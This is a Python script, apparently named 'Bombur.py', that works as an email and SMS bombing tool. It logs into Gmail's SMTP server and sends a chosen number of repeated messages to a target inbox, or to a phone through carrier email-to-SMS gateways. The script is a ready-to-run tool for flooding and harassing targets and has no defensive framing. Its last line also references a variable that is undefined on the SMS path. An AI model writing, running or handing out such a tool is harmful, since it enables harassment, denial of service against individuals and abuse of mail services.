#! python3
__author__ = 'KattStof'
#Bombur.py - a simple email/sms bombing script
# One Script to rule them all
import smtplib, getpass, time

mailserver = smtplib.SMTP_SSL('smtp.gmail.com', 465)
mailserver.ehlo()

username = input("Enter Email Address: ")
password = getpass.getpass()
print("__________________")
print("   BOMBUR")
print("Email/SMS Bomber")
print("__________________")
print('1) SMS Bomb')
print('2) E-mail Bomb')
choice = input("Enter Option: ")
if choice == '1':
    print("""
    1)AT&T
    2)Verizon
    3)T-Mobile
    4)Sprint
    5)VirginMobile
    6)USCellular
    7)Boost
    """)
    carrier = input("Enter Phone Carrier: ")
    number = input("Enter Phone Number: ")
    texttosend = input("Text to send: ")
    timestosend = int(input("Number of texts to send: "))
    if carrier == '1':
        sendto = number + '@text.att.net'
    elif carrier == '2':
        sendto = number + '@vtext.com'
    elif carrier == '3':
        sendto = number + '@tmomail.net'
    elif carrier == '4':
        sendto = number + '@messaging.sprintpcs.com'
    elif carrier == '5':
        sendto = number + '@vmobl.com'
    elif carrier == '6':
        sendto = number + '@email.uscc.net'
    elif carrier == '7':
        sendto = number + '@myboostmobile.com'
    mailserver.login(username,password)
    for x in range(0,timestosend):
        time.sleep(2)
        mailserver.sendmail(username, sendto, texttosend)
        print ("Sending text #", x + 1)
    print (timestosend," Text sent to " ,number, " successfully")
if choice == '2':
    mailserver.login(username, password)
    from_email = input('Enter From Email: ')
    to_email = input('Enter Email Address To Bomb:')
    subject = input('Enter Email Subject: ')
    body = input('Enter Email Body: ')
    ammount = int(input('How Many Emails to send?: '))
    for i in range(ammount):
        print('Sending email #' + str(i + 1))
        time.sleep(2)
        mailserver.sendmail(from_email, to_email,'Subject:' + subject + '\n' + body)
print(ammount,"Emails sent to", to_email, "successfully")
